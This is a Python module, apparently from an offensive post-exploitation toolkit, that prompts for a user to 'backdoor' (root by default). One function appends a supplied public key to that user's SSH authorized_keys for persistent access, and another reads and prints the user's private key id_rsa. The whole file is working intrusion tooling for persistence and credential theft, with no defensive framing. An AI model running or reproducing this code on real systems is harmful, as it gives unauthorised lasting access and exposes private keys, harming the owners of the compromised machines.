import os
from pwd import getpwnam
from colors import *

def validateOptions():
    #User name
    pInfo("Write 0 in any input to exit the current tool.")
    user = input("Which user do you want to backdoor?(root as default) ")
    if user == '0':
        return False
    elif user == '':
        user = 'root'
    try:
        getpwnam(user)
    except KeyError:
        pError(f'User {user} does not exist.')
        return False
    #Path check
    path = ''
    if user == 'root':
        path = '/root/.ssh/'
    else:
        path = f'/home/{user}/.ssh/'
    if not os.path.isdir(path):
        pError(f'User {user} does not have a valid ssh folder. Use the command ssh-keygen to create the folder.')
        return False
    return user,path

def copyKey():
    user,path = validateOptions()
    if user == False:
        return
    #Key insert
    key = input("Insert the public key to copy?")
    if key == '0':
        return False
    with open(path+'authorized_keys','a') as file:
        file.write('\n' + key)
    with open(path+'authorized_keys','r') as file:
        pGood(f'Key is correctly placed in {user} authorized_keys file, content:')
        print(file.read())


    
def getKey():
    user,path = validateOptions()
    if user == False:
        return
    
    with open(path+'id_rsa','r') as file:
        pGood('Private key (id_rsa) content:')
        print(file.read())
    with open(path+'id_rsa.pub','r') as file:
        pGood('Public key (id_rsa.pub) content:')
        print(file.read())

